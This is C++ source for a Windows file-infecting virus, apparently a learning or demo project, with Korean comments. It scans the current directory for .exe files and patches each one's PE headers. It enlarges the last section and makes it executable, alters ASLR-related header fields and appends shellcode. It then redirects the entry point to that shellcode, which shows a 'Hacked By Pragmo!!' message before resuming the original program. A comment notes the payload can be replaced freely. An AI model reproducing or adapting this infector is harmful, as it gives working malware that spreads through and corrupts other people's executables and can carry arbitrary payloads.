#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <io.h>
#include <direct.h>
#include "framework.h"
#include "ParamanyVirus.h"

using namespace std;

std::vector<std::string> get_files_inDirectory(const std::string& _path, const std::string& _filter)
{
	std::string searching = _path + _filter;

	std::vector<std::string> return_;

	_finddata_t fd;
	long handle = _findfirst(searching.c_str(), &fd);  //현재 폴더 내 모든 파일을 찾는다.

	if (handle == -1)    return return_;

	int result = 0;
	do
	{
		return_.push_back(fd.name);
		result = _findnext(handle, &fd);
	} while (result != -1);

	_findclose(handle);

	return return_;
}

DWORD ReadDWORD(fstream* target, uint32_t addr)
{
	DWORD result = 0;
	target->seekg(addr);
	for (int i = 0; i < 4; i++)
	{
		char* p = (char*)&result;
		char letter;
		target->get(letter);
		p[i] = letter;
	}
	return result;
}
void WriteDWORD(fstream* target, uint32_t addr, uint32_t value)
{
	target->seekp(addr);

	for (int i = 0; i < 4; i++)
	{
		char* p = (char*)&value;
		target->put(p[i]);
	}
}
int APIENTRY wWinMain(
	_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPWSTR    lpCmdLine,
	_In_ int       nCmdShow)
{

	// 삽입시킬 악성코드. 지금은 "Hacked By Pragmo!!" 메시지를 띄우는 코드지만 유동적으로 변경가능
	char shellcode[] = 
		"\xEB\x71\x52\x33\xD2\x52\x52\x52\xC7\x44\x24\x04\x00\x00\x00\x00"
		"\xEB\x12\xFF\x44\x24\x04\x8B\x14\x24\x31\x14\x24\x8B\x54\x24\x08"
		"\x31\x54\x24\x08\x53\x8B\x5C\x24\x08\x8D\x14\x9D\x00\x00\x00\x00"
		"\x5B\x03\xD1\x8B\x34\x13\x03\xF3\xEB\x03\xFF\x04\x24\x33\xC0\xAC"
		"\x01\x44\x24\x08\x3C\x00\x75\xF2\x8B\x54\x24\x0C\x39\x54\x24\x08"
		"\x75\xC0\x8B\x54\x24\x04\x58\x58\x58\x58\xC3\x8B\x71\x24\x03\xF3"
		"\x8D\x34\x56\x33\xC0\x66\xAD\xC3\x8B\x71\x1C\x03\xF3\x8B\x14\x86"
		"\x03\xD3\xC3\x33\xDB\x64\x8B\x1D\x30\x00\x00\x00\x8B\x5B\x0C\x8B"
		"\x5B\x14\x8B\x1B\x8B\x1B\x8B\x5B\x10\x53\x8B\x4B\x3C\x8B\x4C\x0B"
		"\x78\x8D\x14\x0B\x52\x8B\x4C\x0B\x20\xBA\x7A\x05\x00\x00\xE8\x5F"
		"\xFF\xFF\xFF\x8B\x0C\x24\xE8\xB0\xFF\xFF\xFF\xE8\xB8\xFF\xFF\xFF"
		"\x52\x6A\x00\x68\x61\x72\x79\x41\x68\x4C\x69\x62\x72\x68\x4C\x6F"
		"\x61\x64\x54\x53\xFF\xD2\x83\xC4\x10\x68\x6C\x6C\x00\x00\x68\x33"
		"\x32\x2E\x64\x68\x75\x73\x65\x72\x54\xFF\xD0\x83\xC4\x0C\x5A\x68"
		"\x6F\x78\x41\x00\x68\x61\x67\x65\x42\x68\x4D\x65\x73\x73\x54\x50"
		"\xFF\xD2\x8B\xF0\x68\x21\x21\x00\x00\x68\x61\x67\x6D\x6F\x68\x79"
		"\x20\x50\x72\x68\x65\x64\x20\x42\x68\x48\x61\x63\x6B\x8B\xC4\x6A"
		"\x00\x68\x68\x61\x68\x61\x8B\xDC\x6A\x00\x53\x50\x6A\x00\xFF\xD6"
		"\x83\xC4\x1C"
		// jmp OEP
		"\xB8\x78\x56\x34\x12\xFF\xE0";

	const int shell_len = 16 * 18 + 3 + 7;
	vector<string> files;
	char dir[100] = "";
	_getcwd(dir, 100);

	fstream target;

	dir[strlen(dir)] = '\\';
	files = get_files_inDirectory(dir, "*.exe"); // 현재 디렉터리에 있는 exe파일들 찾기
	for (int i = 0; i < files.size(); i++) // 현재 디렉터리의 모든 exe파일에 악성코드 삽입
	{
		DWORD temp;

		target.open((string(dir) + files[i]).c_str(), ios::in | ios::out | ios::binary);
		if (!target.is_open())
			continue;
		
		DWORD NT_HEADER = ReadDWORD(&target, 0x3C); // NT HEADER 오프셋 읽기
		temp = ReadDWORD(&target, NT_HEADER + 6); // 섹션 개수 구하기
		temp &= 0x0000FFFF;
		
		DWORD EXTENDED_SECTION_HEADER = NT_HEADER + 24 + (ReadDWORD(&target, NT_HEADER + 20) & 0x0000FFFF);
		for (int j = 0; j < temp - 1; j++)
			EXTENDED_SECTION_HEADER += 40; // 확장할 섹션의 헤더 오프셋 구하기

		DWORD RawDataSize = ReadDWORD(&target, EXTENDED_SECTION_HEADER + 16); // Size of Raw Data
		WriteDWORD(&target, EXTENDED_SECTION_HEADER + 16, RawDataSize + shell_len);
		WriteDWORD(&target, EXTENDED_SECTION_HEADER + 8, RawDataSize + shell_len); // Virtual Size
		temp = ReadDWORD(&target, EXTENDED_SECTION_HEADER + 0x24); // Characteristics
		WriteDWORD(&target, EXTENDED_SECTION_HEADER + 0x24, temp ^ 0x20000000); // Characteristics에 EXECUTE권한 추가
		WriteDWORD(&target, NT_HEADER + 0xA0, 0); // ASLR 제거
		WriteDWORD(&target, NT_HEADER + 0x50, 0x6FFFFFFF); // Size Of Image 확장

		DWORD EXTENDED_SECTION = ReadDWORD(&target, EXTENDED_SECTION_HEADER + 0x14);

		DWORD OEP = ReadDWORD(&target, NT_HEADER + 0x28);
		DWORD ImageBase = ReadDWORD(&target, NT_HEADER + 0x34);
		temp = ImageBase + OEP;
		for (int j = 0; j < 4; j++)
		{
			char* p = (char*)&temp;
			shellcode[shell_len - 6 + j] = p[j]; // jmp OEP 코드 구성
		}

		// 악성코드 삽입
		target.seekp(EXTENDED_SECTION + RawDataSize);
		for (int i = 0; i < shell_len; i++)
			target.put(shellcode[i]);
		//----------

		temp = ReadDWORD(&target, EXTENDED_SECTION_HEADER + 0xC); // SECTION RVA
		WriteDWORD(&target, NT_HEADER + 0x28, temp + RawDataSize); // Entry Point set

		target.close();
	}
}